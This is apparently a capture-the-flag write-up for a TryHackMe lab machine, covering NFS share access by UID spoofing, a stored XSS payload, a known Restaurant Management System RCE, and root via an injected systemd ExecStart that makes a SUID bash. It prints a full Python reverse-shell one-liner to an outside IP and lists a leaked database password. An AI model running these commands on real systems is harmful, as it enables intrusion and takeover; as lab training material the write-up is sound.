# Zeno - Writeup

- **Machine Name:** Hijack
- **Platform:** TryHackMe
- **Difficulty:** Easy

## Overview

## Attack Path
1. Port Scanning with nmap
2. RPC Mount access 

## Enumeration

### Nmap Scan
```bash
$ nmap -sV -sC -T4 --vv -p 22,21,80,111,2049,44204,47743,51488 -o nmap_scan 10.67.189.191

PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 62 vsftpd 3.0.3
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDpnR3ykEuk2NQvQc0himxsomjasxw3O/GG4qFs6hsvMeL9Tz2XjphokcWL047dwd+nlJTunp4g3NIPNZ4fRM3Je/FhUcnOEN1r9lrqv8Nj5Z7W6ijggHOKF+TroSfIAY4lQqGj6mxH1v6x/KmaUYHeUzRc0CjiYambzDPWrMINP1Ystdzf0an4j6B019hNJqIZf0hqVE+85By1QB/2KkwHInr5NchKDDGjuORwK2aYia/y4OwtoXFN1bYEKo86ArmgPISJ1fiQvul9l8jp//LWQ6LP4CL0RazQpgVN0KYycjF9apiElB/wCbJmu46OJq+4MwAvNdZ0k9yKB851QCED
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFLpu0hiiZtLDcv/LyQ1ueZ+JwHOws+dcFw/ec/uzWAcwO26pPCBjZ8ChHD7Wucjfb8JOVVEG/BsSaAnunj7oGM=
|   256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILDB99YDzbOHshtveNLYuxSz88jXIuijXj8gyYVZx/Nn
80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
111/tcp   open  rpcbind syn-ack ttl 62 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      42788/tcp6  mountd
|   100005  1,2,3      44204/tcp   mountd
|   100005  1,2,3      53651/udp6  mountd
|   100005  1,2,3      53712/udp   mountd
|   100021  1,3,4      37038/tcp   nlockmgr
|   100021  1,3,4      37690/tcp6  nlockmgr
|   100021  1,3,4      43488/udp   nlockmgr
|   100021  1,3,4      60191/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs     syn-ack ttl 62 2-4 (RPC #100003)
44204/tcp open  mountd  syn-ack ttl 62 1-3 (RPC #100005)
47743/tcp open  mountd  syn-ack ttl 62 1-3 (RPC #100005)
51488/tcp open  mountd  syn-ack ttl 62 1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Among the services, ftp (port 21), http (80) and rpc (111) stand out.
Let's start mounting the rpc internal shares on our machine:

```bash
$ mkdir mnt/nfs
$ sudo mount 10.67.189.191:/ mnt/nfs
```

This way, we mount the "/" directory on the machine inside our "mnt/nfs" directory.

```bash
$ ls -l share 
ls: cannot open directory 'share': Permission denied
                                                                                                       
$ ls -la     
total 12
drwxr-xr-x  3 root root 4096 Aug  8  2023 .
drwxr-xr-x 23 root root 4096 Mar 15 22:53 ..
drwx------  2 1003 1003 4096 Aug  8  2023 share
```

Infortunately, we don't have permission to access the share folder since just the user with uid 1003 has permissions. However, we can bypass this rule by creating a user with uid 1003 in our machine:

```bash
$ sudo useradd -m -u 1003 -s /bin/bash hijack
$ sudo su hijack
```

### Web Enumeration

After the scanning. I started a directory enumeration with gobuster:
```bash
gobuster dir -u http://10.64.179.44:12340 -w /usr/share/wordlists/dirb/big.txt --random-agent
```

A few minutes after, the command returned the ```/rms``` directory.
This directory hosted a Restaurant Management System.
## Vulnerability Analysis

### Stored Cross-Site Scripting

While testing the application, a stored Cross-Site Scripting (XSS) vulnerability was identified at the register functionality.
It was possible to set your first name as a XSS Payload, such as: ```<img src=x onerror="alert(1)">```. This would trigger an alert when accessing your profile information.
However, the XSS did not lead to session hijacking or further compromise and was not useful for exploitation.

### Remote Code Execution

Further research revealed that the application version was vulnerable to a known Remote Code Execution flaw:

```bash
searchsploit restaurant management system               
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Restaurant Management System 1.0  - SQL Injection                                 | php/webapps/51330.txt
Restaurant Management System 1.0 - Remote Code Execution                          | php/webapps/47520.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Exploitation

I set up a netcat listener:

```bash
nc -lnvp 443
listening on [any] 443 ...
```

I ran the exploit, which uploaded a malicious PHP file at: ```/images/reverse-shell.php```

Then, I received a connection after injecting the following Python reverse shell payload: 
```
export RHOST="192.168.136.51";export RPORT=555;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

## Post Exploitation

### Credential Discovery

While enumerating the web directory, the following file was identified:

```
/var/www/html/rms/connection/config.php
```

This file contained hardcoded database credentials:

```
root: veerUffIrangUfcubyig
```

### MySQL Access

The credentials were used to access the local MySQL service:

```
mysql -h 127.0.0.1 -u root -p
```

Although access was successful, no useful information was found in the databases. Further privilege escalation was required.

## Privilege Escalation

### Local Enumeration

After running linenum.sh, a sensitive file was found in:

```
/etc/fstab
```

This file contained a reusable password, which allowed escalation to the user edward.

The user flag was retrieved from:

```
/home/edward/user.txt
```

### Sudo Permissions

Checking sudo privileges with ```sudo -l```, I discovered that we can run ```/usr/sbin/reboot``` with root privileges.

While limited, this permission became useful in combination with another misconfiguration.

### systemd Service Abuse

Further enumeration with LinPEAS revealed thath we have write permissions on the following service file:

```/etc/systemd/system/zeno-monitoring.service```

I modified the original file by injecting a malicious payload into the ExecStart directive:

```ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash; chmod +xs /home/edward/bash'```

## Root Access

After modifying the service, the system was rebooted:

```sudo /usr/sbin/reboot```

Once the system restarted, the reverse shell was re-established.

The SUID bash binary was then executed:

```/home/edward/bash -p```

This resulted in a root shell.

The root flag was obtained from:

```/root/root.txt```

## Conclusion

Even being a tough machine, it was a very fun to play with and I have leaned a lot from it. 

This machine demonstrated the importance of:

- Keeping web applications up to date
- Avoiding writable systemd service files
- Restricting sudo permissions

The exploitation chain combined a known RCE vulnerability with poor system configuration to achieve full system compromise.

